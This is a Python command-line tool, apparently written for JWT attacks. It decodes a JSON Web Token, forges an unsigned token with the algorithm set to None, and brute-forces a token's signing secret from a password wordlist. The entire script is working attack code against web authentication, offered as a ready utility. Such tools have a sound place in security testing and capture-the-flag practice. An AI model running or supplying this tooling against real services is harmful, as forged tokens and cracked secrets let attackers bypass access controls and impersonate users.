from base64 import b64decode
from os import system,name
from tkinter.filedialog import askopenfilename
from tkinter import Tk
import json 
import binascii,jwt


def clear():
    if name == "nt":
        system('cls')
    else:
        system('clear')

class JWTips():
    def __init__(self):
        self.run = True
        clear()
    def gui(self):
        print('- - - [  JWTips! By Kynda  ] - - -\n\n[1] Token information\n[2] Change algorithm to None\n[3] Bruteforce token')
        n = input("\n\n[>>] ")
        if n == "1":
            self.infos()
        elif n == "2":
            self.toNone()
        elif n == "3":
            self.bruteForce()
        else:
            clear()
            print('[x] Choice Error - Invalid number\n')
    def infos(self):
        try:
            clear()
            token = input('JSON Web Token : ')
            header,payload = token.split('.')[0],token.split('.')[1]
            print("[Token content]\n\n\n[+] Header : {}\n\n[+] Payload : {}\n".format(b64decode(header+'==').decode('utf-8'),b64decode(payload+'==').decode('utf-8')))
        except IndexError:
            print('[x] Format Error - Invalid token\n')
        except binascii.Error:
            print('[x] Padding Error - Invalid token\n')
    def toNone(self):
        clear()
        try:
            payload = json.loads(input('Payload ? ( Example => {"role":"user"} ) : '))
            print("[+] New JWT : {}\n".format(jwt.encode(payload,'',algorithm=None).decode('utf-8')))
        except json.decoder.JSONDecodeError:
            print("[x] JSON Error - Invalid Payload Format\n")
    def bruteForce(self):
        clear()
        Tk().withdraw()
        token = input('JSON Web Token : ')
        pass_list = [i.strip() for i in open(askopenfilename(title="Password list ?"),'r',encoding='utf-8')]
        try:
            algo,payload = json.loads(b64decode(token.split('.')[0]+'==').decode('utf-8'))['alg'],json.loads(b64decode(token.split('.')[1]+'==').decode('utf-8'))
            for i in pass_list:
                if jwt.encode(payload,i,algorithm=algo).decode('utf-8') == token:
                    print("[+] Good news !\nSecret Found : {}\n".format(i))
                    break
        except IndexError:
            print('[x] Format Error - Invalid token\n')
        except binascii.Error:
            print('[x] Padding Error - Invalid token\n')
        except json.decoder.JSONDecodeError:
            print("[x] JSON Error - Invalid Payload Format\n")






if __name__ == "__main__":
    jwtips = JWTips()
    while jwtips.run:
        jwtips.gui()
